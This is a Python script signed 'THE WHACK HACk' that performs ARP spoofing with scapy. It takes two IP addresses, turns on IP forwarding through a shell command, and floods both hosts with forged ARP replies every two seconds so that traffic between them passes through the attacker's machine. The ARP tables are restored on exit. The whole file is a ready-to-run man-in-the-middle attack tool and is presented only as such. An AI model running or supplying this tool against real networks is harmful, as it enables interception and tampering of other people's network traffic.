# By: THE WHACK HACk

# !/usr/bin/env python
import scapy.all as scapy
from time import sleep
import argparse
import subprocess


def get_input():
    agp = argparse.ArgumentParser()
    agp.add_argument("-t1", "-target1", dest="target1", help="The 1st IP addresses to spoof.")  # User Option
    agp.add_argument("-t2", "-target2", dest="target2", help="The 2nd IP addresses to spoof.")
    options = agp.parse_args()
    return options.target1, options.target2


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc


def spoof(target_ip, gateway_ip):  # Spoofing Ip, MITM
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)  # op == 2 --> Response
    scapy.send(packet, verbose=False)


def restore_spoof(target_ip, gateway_ip):  # Restoring ARP table to normal
    target_mac = get_mac(target_ip)
    router_mac = get_mac(gateway_ip)
    packet = scapy.ARP(op=2, psrc=gateway_ip, hwsrc=router_mac, pdst=target_ip, hwdst=target_mac)
    scapy.send(packet, count=4, verbose=False)


arguments = get_input()
targetIP = arguments[0]
gatewayIP = arguments[1]

subprocess.run("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)  # Port Forwarding
try:  # Exception Handling
    packets = 0
    while True:
        spoof(targetIP, gatewayIP)
        spoof(gatewayIP, targetIP)
        packets += 2
        print("\r[+]Packets sent: ", str(packets), end="")  # \r Prints from the beginning --> Dynamic Printing.
        sleep(2)  # Sleep after every 2 seconds.
except KeyboardInterrupt:
    print("\n[+] Detected CTRL + C")
    print("\tRestoring ARP tables....")
    print("\tPlease wait....")
    restore_spoof(targetIP, gatewayIP)
    restore_spoof(gatewayIP, targetIP)
    print("[+] Restored ARP Tables\n\tQuitting...")
